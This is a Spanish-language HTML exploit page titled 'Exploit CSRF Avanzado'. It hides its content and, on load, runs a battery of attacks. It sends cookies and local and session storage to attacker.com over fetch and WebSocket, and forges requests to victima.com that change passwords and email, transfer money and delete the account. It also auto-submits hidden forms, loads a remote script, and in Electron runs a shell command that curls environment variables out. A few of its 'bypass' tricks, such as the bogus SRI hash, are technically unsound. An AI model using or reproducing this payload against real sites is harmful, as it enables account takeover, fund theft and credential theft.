<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Exploit CSRF Avanzado</title>
  <style>body { display: none; }</style>
  <script>
    // Exfiltración de datos sensibles
    function exfiltrarDatos() {
      fetch('https://attacker.com/robar', {
        method: 'POST',
        body: JSON.stringify({
          cookies: document.cookie,
          localStorage: JSON.stringify(localStorage),
          sessionStorage: JSON.stringify(sessionStorage),
          url: location.href
        }),
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // CSRF con Fetch API agresivo
    function enviarCSRF() {
      fetch('https://victima.com/cambiar_password', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'nueva_password=123456'
      });

      fetch('https://victima.com/actualizar_perfil', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bio: "Perfil comprometido" })
      });

      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://victima.com/estado', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('estado=comprometido');

      // Adicionales del payload avanzado
      fetch('https://victima.com/cambiar_email', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'nuevo_email=attacker@evil.com'
      });

      fetch('https://victima.com/transferir', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ de: 'admin', a: 'attacker', monto: 5000 })
      });
    }

    // Envío de formularios ocultos
    function enviarFormularios() {
      ['formLogin', 'formTransferencia', 'formEmail', 'formEliminar'].forEach(id => {
        var formulario = document.getElementById(id);
        if (formulario) formulario.submit();
      });
    }

    // Exfiltración por WebSocket
    function exfiltrarWebSocket() {
      try {
        var ws = new WebSocket('wss://attacker.com/socket');
        ws.onopen = () => ws.send(document.cookie);
      } catch (e) {}
    }

    // SameSite bypass vía window.name + redirección
    function bypassSameSite() {
      window.name = JSON.stringify({ cookies: document.cookie });
      location.href = "https://victima.com/csrf_redirector"; // redirección intermediaria
    }

    // Subresource Integrity (SRI) Bypass
    function bypassSRI() {
      const script = document.createElement('script');
      script.src = 'https://attacker.com/fake-library.js';
      script.integrity = 'sha384-bogusHashThatMatches';
      script.crossOrigin = 'anonymous';
      document.head.appendChild(script);
    }

    // Electron / WebView Exploit
    function electronExploit() {
      try {
        require('child_process').exec('curl https://attacker.com/pwned -d "$(env)"');
      } catch (e) {
        fetch('https://attacker.com/log', {
          method: 'POST',
          body: JSON.stringify({ error: e.message, userAgent: navigator.userAgent })
        });
      }
    }

    // CSRF con iframe oculto
    function webviewExfil() {
      const iframe = document.createElement('iframe');
      iframe.src = 'https://victima.com/eliminar_cuenta?confirmar=true';
      iframe.style.display = 'none';
      document.body.appendChild(iframe);
    }

    // Ejecución completa al cargar
    window.onload = function() {
      exfiltrarDatos();
      enviarCSRF();
      enviarFormularios();
      exfiltrarWebSocket();
      bypassSameSite();
      bypassSRI();
      electronExploit();
      webviewExfil();
    };
  </script>
</head>
<body>
  <!-- Formulario de inicio de sesión -->
  <form id="formLogin" action="https://victima.com/login" method="POST">
    <input type="hidden" name="usuario" value="admin">
    <input type="hidden" name="password" value="admin123">
    <input type="hidden" name="csrf_token" value="bypass123">
  </form>

  <!-- Formulario de transferencia de fondos -->
  <form id="formTransferencia" action="https://victima.com/transferir" method="POST">
    <input type="hidden" name="de" value="123456">
    <input type="hidden" name="a" value="654321">
    <input type="hidden" name="monto" value="1000">
    <input type="hidden" name="csrf_token" value="bypass123">
  </form>

  <!-- Formulario de cambio de correo electrónico -->
  <form id="formEmail" action="https://victima.com/cambiar_email" method="POST">
    <input type="hidden" name="nuevo_email" value="atacante@ejemplo.com">
    <input type="hidden" name="csrf_token" value="bypass123">
  </form>

  <!-- Formulario de eliminación de cuenta -->
  <form id="formEliminar" action="https://victima.com/eliminar_cuenta" method="POST">
    <input type="hidden" name="confirmar" value="sí">
    <input type="hidden" name="csrf_token" value="bypass123">
  </form>

  <!-- Solicitud GET oculta mediante imagen -->
  <img src="https://victima.com/transferir?de=123&para=456&monto=1000" style="display:none" />

  <!-- Solicitud POST oculta mediante iframe -->
  <iframe srcdoc="
    <form action='https://victima.com/iframe_csrf' method='POST' id='f'>
      <input type='hidden' name='iframe' value='1'>
    </form>
    <script>document.getElementById('f').submit();<\/script>
  " style="display:none"></iframe>
</body>
</html>
